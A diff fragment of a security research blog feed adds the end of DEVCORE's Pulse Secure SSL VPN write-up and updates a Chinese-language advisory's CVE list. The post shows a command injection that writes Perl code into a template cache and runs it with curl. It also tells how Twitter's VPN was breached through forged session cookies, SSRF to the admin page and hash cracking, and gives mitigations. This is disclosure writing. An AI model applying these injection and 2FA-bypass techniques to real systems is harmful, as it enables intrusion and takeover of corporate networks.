+ 2&amp;gt;/data/runtime/tmp/tt/setcookie.thtml.ttc &amp;lt; 
+ &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
+ 2&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And the generated &lt;code class=&quot;highlighter-rouge&quot;&gt;setcookie.thtml.ttc&lt;/code&gt; looks like:&lt;/p&gt;
+
+&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;tcpdump:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ls /&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#: No such file or directory&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once we have done this, we can just fetch the corresponding page to execute our command:&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://sslvpn/dana-na/auth/setcookie.cgi
+ boot  bin  home  lib64       mnt      opt  proc  sys  usr  var
+ data  etc  lib   lost+found  modules  pkg  sbin  tmp 
+ ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So far, the whole technical part of this command injection is over. However, we think there may be another creative way to exploit this, if you found one, please tell me!&lt;/p&gt;
+
+&lt;h1 id=&quot;the-case-study&quot;&gt;The Case Study&lt;/h1&gt;
+
+&lt;p&gt;After Pulse Secure patched all the bugs on &lt;strong&gt;April 24, 2019&lt;/strong&gt;. We kept monitoring the Internet to measure the response time of each large corporation. Twitter is one of them. They are known for their &lt;a href=&quot;http://hackerone.com/twitter&quot;&gt;bug bounty program&lt;/a&gt; and nice to hackers. However, it’s improper to exploit a 1-day right after the patch released. So we wait 30 days for Twitter to upgrade their SSL VPN.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We have to say, we were nervous during that time. The first thing we did every morning is to check whether Twitter upgrades their SSL VPN or not! It was an unforgettable time for us :P&lt;/p&gt;
+
+&lt;p&gt;We started to hack Twitter on &lt;strong&gt;May 28, 2019&lt;/strong&gt;. During this operation, we encounter several obstacles. The first one is, although we can obtain the plaintext password of Twitter staffs, we still can’t log into their SSL VPN because of the Two Factor Authentication. Here we suggest two ways to bypass that. The first one is that we observed Twitter uses the solution from &lt;a href=&quot;https://duo.com&quot;&gt;Duo&lt;/a&gt;. The &lt;a href=&quot;https://duo.com/docs/pulseconnect&quot;&gt;manual&lt;/a&gt; mentions:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The security of your Duo application is tied to the security of your secret key (skey). Secure it as you would any sensitive credential. Don’t share it with unauthorized individuals or email it to anyone under any circumstances!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So if we can extract the secret key from the system, we can leverage the Duo API to bypass the 2FA. However, we found a quicker way to bypass it. Twitter enabled the &lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB30329&quot;&gt;Roaming Session&lt;/a&gt; feature, which is used to enhances mobility and allows a session from multiple IP locations.&lt;/p&gt;
+
+&lt;p&gt;Due to this “&lt;strong&gt;convenient&lt;/strong&gt;” feature, we can just download the session database and forge our cookies to log into their system!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Until now, we are able to access Twitter Intranet. Nevertheless, our goal is to achieve code execution! It sounds more critical than just accessing the Intranet. So we would like to chain our command injection bug(CVE-2019-11539) together. OK, here, we encountered another obstacle. It’s the restricted management interface!&lt;/p&gt;
+
+&lt;p&gt;As we mentioned before, our bug is on the management interface. But for the security consideration, most of the corporation disable this interface on public, so we need another way to access the admin page. If you have read our previous article carefully, you may recall the “&lt;strong&gt;WebVPN&lt;/strong&gt;” feature! WebVPN is a proxy which helps to connect to anywhere. So, let’s connect to itself.&lt;/p&gt;
+
+&lt;p&gt;Yes, it’s SSRF! &lt;br /&gt;&lt;br /&gt;Here we use a small trick to bypass the SSRF protections.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahha! Through our SSRF, we can touch the interface now! Then, the last obstacle popped up. We didn’t have any plaintext password of managers. When Perl wants to exchange data with native procedures, such as the Perl extension in C++ or web server, it uses the cache to store data. The problem is, Pulse Secure forgets to clear the sensitive data after exchange, so that’s why we can obtain plaintext passwords in the cache. But practically, most of the managers only log into their system for the first time, so it’s hard to get the manager’s plaintext password. The only thing we got, is the password hash in &lt;code class=&quot;highlighter-rouge&quot;&gt;sha256(md5_crypt(salt, …))&lt;/code&gt; format…&lt;/p&gt;
+
+&lt;p&gt;If you are experienced in cracking hashes, you will know how hard it is. So…&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;We launched a 72 core AWS to crack that.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We cracked the hash and got the RCE successfully! I think we are lucky because from our observation, there is a very strong password policy on Twitter staffs. But it seems the policy is not applied to the manager. The manager’s password length is only ten, and the first character is &lt;strong&gt;B&lt;/strong&gt;. It’s at a very early stage of our cracking queue so that we can crack the hash in 3 hours.&lt;/p&gt;
+
+&lt;p&gt;We reported all of our findings to Twitter and got the highest bounty from them. Although we can not prove that, it seems this is the first remote code execution on Twitter! If you are interested in the full report, you can check the &lt;a href=&quot;https://hackerone.com/reports/591295&quot;&gt;HackerOne link&lt;/a&gt; for more details.&lt;/p&gt;
+
+&lt;h1 id=&quot;recommendations&quot;&gt;Recommendations&lt;/h1&gt;
+
+&lt;p&gt;How to mitigate such attacks? Here we give several recommendations.&lt;/p&gt;
+
+&lt;p&gt;The first is the Client-Side Certificate. It’s also the most effective method. Without a valid certificate, the malicious connection will be dropped during SSL negotiation! The second is the Multi-factor Authentication. Although we break the Twitter 2FA this time, with a proper setting, the MFA can still decrease numerous attack surface. Next, enable the full log audit and remember to send to an out-bound log server.&lt;/p&gt;
+
+&lt;p&gt;Also, perform your corporate asset inventory regularly and subscribe to the vendor’s security advisory. The most important of all, always keep your system updated!&lt;/p&gt;
+
+&lt;h1 id=&quot;bonus-take-over-all-the-vpn-clients&quot;&gt;Bonus: Take over all the VPN clients&lt;/h1&gt;
+
+&lt;p&gt;Our company, &lt;a href=&quot;https://devco.re/&quot;&gt;DEVCORE&lt;/a&gt;, provides the most professional red team service in Asia. In this bonus part, let’s talk about how to make the red team more &lt;strong&gt;RED&lt;/strong&gt;!&lt;/p&gt;
+
+&lt;p&gt;We always know that in a red team operation, the personal computer is more valuable! There are several old-school methods to compromise the VPN clients through SSL VPN before, such as the water-hole attack and replacing the VPN agent.&lt;/p&gt;
+
+&lt;p&gt;During our research, we found a new attack vector to take over all the clients. It’s the “&lt;strong&gt;logon script&lt;/strong&gt;” feature. It appears in almost EVERY SSL VPNs, such as OpenVPN, Fortinet, Pulse Secure… and more. It can execute corresponding scripts to mount the network file-system or change the routing table once the VPN connection established.&lt;/p&gt;
+
+&lt;p&gt;Due to this “&lt;strong&gt;hacker-friendly&lt;/strong&gt;” feature, once we got the admin privilege, we can leverage this feature to infect all the VPN clients! Here we use the Pulse Secure as an example, and demonstrate how to not only compromise the SSL VPN but also take over all of your connected clients:&lt;/p&gt;
+
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/v7JUMb70ON4&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+
+&lt;h1 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h1&gt;
+
+&lt;p&gt;OK, here is the end of this Attacking SSL VPN series! From our findings, SSL VPN is such a huge attack surface with few security researchers digging into. Apparently, it deserves more attention. We hope this kind of series can encourage other researchers to engage in this field and enhance the security of enterprises!&lt;/p&gt;
+
+&lt;p&gt;Thanks to all guys we met, co-worked and cooperated. We will publish more innovative researches in the future :)&lt;/p&gt;
+
+</description>
+                <link>https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/</link>
+                <guid>https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study</guid>
+                <pubDate>Mon, 02 Sep 2019 00:00:00 +0800</pubDate>
+        </item>
 
         <item>
                 <title>Pulse Secure SSL VPN 資安通報</title>
@@ -17,13 +323,13 @@
 &lt;p&gt;在我們對 Pulse Secure SSL VPN 的安全研究中，共發現了下列七個弱點。組合利用有機會取得 SSL VPN 設備的最高權限，可讓攻擊者進入用戶內網，甚至控制每個透過 SSL VPN 連線的使用者裝置。&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;CVE-2019-11507: Cross-Site Scripting&lt;/li&gt;
-  &lt;li&gt;CVE-2019-11508: Post-auth Unrestricted File Upload&lt;/li&gt;
-  &lt;li&gt;CVE-2019-11510: Pre-auth Arbitrary File Reading&lt;/li&gt;
-  &lt;li&gt;CVE-2019-11538: Post-auth(user) Arbitrary File Reading&lt;/li&gt;
-  &lt;li&gt;CVE-2019-11539: Post-auth(admin) Command Injection&lt;/li&gt;
-  &lt;li&gt;CVE-2019-11540: Session Hijacking&lt;/li&gt;
-  &lt;li&gt;CVE-2019-11542: Post-auth(admin) Stack Buffer Overflow&lt;/li&gt;
+  &lt;li&gt;CVE-2019-11510 - Pre-auth Arbitrary File Reading&lt;/li&gt;
+  &lt;li&gt;CVE-2019-11542 - Post-auth(admin) Stack Buffer Overflow&lt;/li&gt;
+  &lt;li&gt;CVE-2019-11539 - Post-auth(admin) Command Injection&lt;/li&gt;
+  &lt;li&gt;CVE-2019-11538 - Post-auth(user) Arbitrary File Reading via NFS&lt;/li&gt;
+  &lt;li&gt;CVE-2019-11508 - Post-auth(user) Arbitrary File Writing via NFS&lt;/li&gt;
+  &lt;li&gt;CVE-2019-11540 - Post-auth Cross-Site Script Inclusion&lt;/li&gt;
+  &lt;li&gt;CVE-2019-11507 - Post-auth Cross-Site Scripting&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;受影響的版本如下：&lt;/p&gt;
@@ -44,7 +350,8 @@
 
 &lt;h3 id=&quot;細節&quot;&gt;細節&lt;/h3&gt;
 
-&lt;p&gt;我們將在近日公布技術細節&lt;/p&gt;
+&lt;p&gt;詳細的技術細節請參閱我們的 Advisory：&lt;br /&gt;
+&lt;a href=&quot;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&quot;&gt;https://devco.re/blog/2019/09/02/attacking-ssl-vpn-part-3-the-golden-Pulse-Secure-ssl-vpn-rce-chain-with-Twitter-as-case-study/&lt;/a&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;
 
